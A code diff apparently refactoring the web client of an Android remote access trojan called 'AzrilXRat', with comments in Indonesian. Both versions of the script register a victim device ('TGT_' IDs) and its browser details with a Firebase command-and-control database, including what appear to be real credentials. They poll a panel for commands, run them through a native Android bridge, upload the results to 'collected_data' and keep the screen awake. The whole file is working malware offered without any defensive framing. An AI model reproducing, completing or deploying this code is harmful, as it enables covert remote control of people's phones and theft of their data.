@@ -21,7 +21,6 @@ body{
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
 .status-text{font-size:12px;color:#0f0;letter-spacing:.05em}
 .device-id{font-size:8px;color:#555;margin-top:8px;word-break:break-all;text-align:center;max-width:90%}
-.debug-log{font-size:8px;color:#333;margin-top:12px;max-width:90%;text-align:center;word-break:break-all}
 </style>
 </head>
 <body>
@@ -29,144 +28,90 @@ body{
 <div class="loader" id="loader"></div>
 <div class="status-text" id="statusMsg">Initializing...</div>
 <div class="device-id" id="devIdDisplay"></div>
-<div class="debug-log" id="debugLog"></div>
 
 <script>
-/* ═══════════════════════════════════════════════════
-   AZRILXRAT CLIENT — ALL IN ONE
-   Config Firebase langsung di sini
-═════════════════════════════════════════════════════ */
+// Generate unique device ID
+const DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
 
-// Debug logger
-const debugEl = document.getElementById('debugLog');
-function debug(msg) {
-  console.log('[AzrilXRat]', msg);
-  debugEl.textContent += msg + '\n';
-}
-
-debug('Starting...');
-
-// ⚠️ CONFIG FIREBASE LANGSUNG
+// CONFIG FIREBASE - URL SUDAH DIBENERIN
 const FIREBASE_CONFIG = {
   apiKey: "AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",
   authDomain: "krynodexrat.firebaseapp.com",
-  databaseURL: "https://krynodexrat-default-rtdb.firebaseio.com",
+  databaseURL: "https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",
   projectId: "krynodexrat",
   storageBucket: "krynodexrat.firebasestorage.app",
   messagingSenderId: "465327768431",
   appId: "1:465327768431:web:3e5871b9f80dcbcad1de9a"
 };
 
-debug('Config loaded');
-
-// Initialize Firebase
-try {
-  firebase.initializeApp(FIREBASE_CONFIG);
-  debug('Firebase initialized');
-} catch(e) {
-  debug('ERROR init: ' + e.message);
-  document.getElementById('statusMsg').textContent = 'Init Error';
-  document.getElementById('loader').style.borderColor = '#f00';
-  throw e;
-}
-
+// Init Firebase
+firebase.initializeApp(FIREBASE_CONFIG);
 const db = firebase.database();
-debug('Database ref ready');
 
-// Test connection dulu
-db.ref('.info/connected').on('value', (snap) => {
-  if (snap.val() === true) {
-    debug('✅ Connected to Firebase!');
-    registerDevice();
-  } else {
-    debug('⏳ Waiting for connection...');
+// Device info
+const deviceInfo = {
+  id: DEVICE_ID,
+  model: navigator.userAgent.split(';')[1]?.trim() || navigator.userAgent.substring(0, 50),
+  platform: navigator.platform,
+  language: navigator.language,
+  userAgent: navigator.userAgent,
+  screenSize: window.screen.width + 'x' + window.screen.height,
+  registeredAt: Date.now(),
+  lastSeen: Date.now(),
+  online: true
+};
+
+// Register ke Firebase
+db.ref('devices/' + DEVICE_ID).set(deviceInfo)
+  .then(() => {
+    document.getElementById('statusMsg').textContent = 'Service Active';
+    document.getElementById('loader').style.borderColor = '#0f0';
+    document.getElementById('devIdDisplay').textContent = DEVICE_ID;
+  })
+  .catch(err => {
+    document.getElementById('statusMsg').textContent = 'Error';
+    document.getElementById('loader').style.borderColor = '#f00';
+    console.error(err);
+  });
+
+// Update lastSeen setiap 30 detik
+setInterval(() => {
+  db.ref('devices/' + DEVICE_ID).update({ lastSeen: Date.now() });
+}, 30000);
+
+// Listen commands dari panel
+db.ref('commands/' + DEVICE_ID).on('child_added', (snap) => {
+  const cmd = snap.val();
+  if (!cmd || cmd.status !== 'pending') return;
+  
+  snap.ref.update({ status: 'processing' });
+  
+  let result = { type: cmd.command, status: 'executed', timestamp: Date.now() };
+  
+  try {
+    if (window.AzrilXRat && typeof window.AzrilXRat.exec === 'function') {
+      const nativeResult = JSON.parse(window.AzrilXRat.exec(cmd.command));
+      result = { ...result, ...nativeResult };
+    } else {
+      result.note = 'no_native_interface';
+    }
+  } catch(e) {
+    result.error = e.message;
   }
+  
+  db.ref('collected_data').push(result);
+  snap.ref.update({ status: 'done' });
+  setTimeout(() => snap.ref.remove(), 2000);
 });
 
-function registerDevice() {
-  // Generate unique device ID
-  const DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
-  
-  debug('Device ID: ' + DEVICE_ID);
-  document.getElementById('devIdDisplay').textContent = 'ID: ' + DEVICE_ID;
+// Handle disconnect
+window.addEventListener('beforeunload', () => {
+  db.ref('devices/' + DEVICE_ID).update({ online: false, lastSeen: Date.now() });
+});
 
-  // Device info
-  const deviceInfo = {
-    id: DEVICE_ID,
-    model: navigator.userAgent.split(';')[1]?.trim() || navigator.userAgent.substring(0, 50),
-    platform: navigator.platform,
-    language: navigator.language,
-    userAgent: navigator.userAgent,
-    screenSize: window.screen.width + 'x' + window.screen.height,
-    registeredAt: Date.now(),
-    lastSeen: Date.now(),
-    online: true
-  };
-
-  debug('Registering device...');
-
-  // Register ke Firebase
-  db.ref('devices/' + DEVICE_ID).set(deviceInfo)
-    .then(() => {
-      document.getElementById('statusMsg').textContent = '✅ Service Active';
-      document.getElementById('loader').style.borderColor = '#0f0';
-      debug('✅ Device registered successfully!');
-    })
-    .catch(err => {
-      document.getElementById('statusMsg').textContent = '❌ Register Error';
-      document.getElementById('loader').style.borderColor = '#f00';
-      debug('ERROR register: ' + err.message);
-      console.error('[AzrilXRat] Register error:', err);
-    });
-
-  // Update lastSeen setiap 30 detik
-  setInterval(() => {
-    db.ref('devices/' + DEVICE_ID).update({ lastSeen: Date.now() });
-    debug('💓 Heartbeat sent');
-  }, 30000);
-
-  // Listen commands dari panel
-  db.ref('commands/' + DEVICE_ID).on('child_added', (snap) => {
-    const cmd = snap.val();
-    if (!cmd || cmd.status !== 'pending') return;
-    
-    debug('📩 Command received: ' + cmd.command);
-    snap.ref.update({ status: 'processing' });
-    
-    // Coba execute via Android interface
-    let result = { type: cmd.command, status: 'executed', timestamp: Date.now() };
-    
-    try {
-      if (window.AzrilXRat && typeof window.AzrilXRat.exec === 'function') {
-        debug('🔧 Executing via native interface');
-        const nativeResult = JSON.parse(window.AzrilXRat.exec(cmd.command));
-        result = { ...result, ...nativeResult };
-      } else {
-        debug('⚠️ No native interface available');
-        result.note = 'no_native_interface';
-      }
-    } catch(e) {
-      debug('❌ Execution error: ' + e.message);
-      result.error = e.message;
-    }
-    
-    // Kirim hasil ke Firebase
-    db.ref('collected_data').push(result);
-    debug('📤 Result sent');
-    snap.ref.update({ status: 'done' });
-    setTimeout(() => snap.ref.remove(), 2000);
-  });
-
-  // Handle disconnect
-  window.addEventListener('beforeunload', () => {
-    db.ref('devices/' + DEVICE_ID).update({ online: false, lastSeen: Date.now() });
-    debug('👋 Device going offline');
-  });
-
-  // Keep screen on (minta via Android)
-  if (window.AzrilXRat && window.AzrilXRat.keepAwake) {
-    window.AzrilXRat.keepAwake();
-  }
+// Keep screen on
+if (window.AzrilXRat && window.AzrilXRat.keepAwake) {
+  window.AzrilXRat.keepAwake();
 }
 </script>
 </body>
